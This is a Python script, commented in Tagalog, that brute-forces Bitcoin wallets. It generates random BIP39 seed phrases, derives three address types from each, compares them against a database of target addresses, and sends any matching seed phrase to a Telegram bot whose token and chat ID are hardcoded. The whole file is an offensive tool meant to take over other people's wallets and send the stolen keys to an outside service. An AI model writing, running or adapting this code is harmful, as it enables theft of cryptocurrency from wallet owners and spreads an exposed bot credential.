import hashlib
import base58
import bech32
import sys
import time
import requests
from mnemonic import Mnemonic
from bip32utils import BIP32Key

# --- CONFIG ---
DATABASE_FILE = "database.txt"
MNEMO = Mnemonic("english")

# ILAGAY MO DITO ANG DETAILS NG BOT MO BOSS
TELEGRAM_TOKEN = "8712690306:AAGFrY73XTvjUcvAmgl7qGyc3K5C79a9Rvw"
TELEGRAM_CHAT_ID = "7938223457"

def send_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"\n[!] Telegram Error: {e}")

def hash160(data):
    sha256 = hashlib.sha256(data).digest()
    ripemd160 = hashlib.new('ripemd160')
    ripemd160.update(sha256)
    return ripemd160.digest()

def derive_addresses(seed_phrase):
    seed_bytes = MNEMO.to_seed(seed_phrase)
    root_key = BIP32Key.fromEntropy(seed_bytes)
    # Legacy (1...)
    legacy = root_key.ChildKey(44+0x80000000).ChildKey(0+0x80000000).ChildKey(0+0x80000000).ChildKey(0).ChildKey(0)
    addr_1 = legacy.Address()
    # SegWit (3...)
    p49 = root_key.ChildKey(49+0x80000000).ChildKey(0+0x80000000).ChildKey(0+0x80000000).ChildKey(0).ChildKey(0)
    rs = b'\x00\x14' + hash160(p49.PublicKey())
    addr_3 = base58.b58encode_check(b'\x05' + hash160(rs)).decode()
    # Native SegWit (bc1...)
    p84 = root_key.ChildKey(84+0x80000000).ChildKey(0+0x80000000).ChildKey(0+0x80000000).ChildKey(0).ChildKey(0)
    addr_bc1 = bech32.encode('bc', 0, hash160(p84.PublicKey()))
    
    return [addr_1, addr_3, addr_bc1]

# 1. LOAD DATABASE
try:
    with open(DATABASE_FILE, "r") as f:
        target_set = set(line.strip() for line in f if line.strip())
    print(f"[*] Loaded {len(target_set)} addresses from database.")
except Exception as e:
    print(f"[!] Error: {e}")
    sys.exit()

# 2. MAIN LOOP WITH COUNTER
def start_brute():
    count = 0
    start_time = time.time()
    
    print("[*] Brute force started... Press Ctrl+C to stop.\n")
    
    try:
        while True:
            trial_seed = MNEMO.generate(strength=128)
            addrs = derive_addresses(trial_seed)
            count += 1
            
            # Ganito ang display sa Logs para makita mo ang progress
            # Nagpi-print tuwing 100 scans para hindi masyadong spammy ang logs
            if count % 100 == 0:
                elapsed = time.time() - start_time
                speed = count / elapsed if elapsed > 0 else 0
                print(f"[#] Total Scanned: {count} | Speed: {speed:.2f} seeds/s")
                print(f"[-] Current Seed: {trial_seed[:30]}...")

            for a in addrs:
                if a in target_set:
                    hit_msg = f"🚀 MATCH FOUND!\n\nSeed: {trial_seed}\nAddress: {a}\n\nTotal scans: {count}"
                    print(f"\n{hit_msg}\n")
                    send_to_telegram(hit_msg)
                    
                    with open("SUCCESS.txt", "a") as out:
                        out.write(f"Seed: {trial_seed} | Addr: {a}\n")
                        
    except KeyboardInterrupt:
        print(f"\n[!] Stopped. Total seeds scanned: {count}")

if __name__ == "__main__":
    # Ito ang magsisilbing "Start Button" pagtakbo ng script
    start_brute()
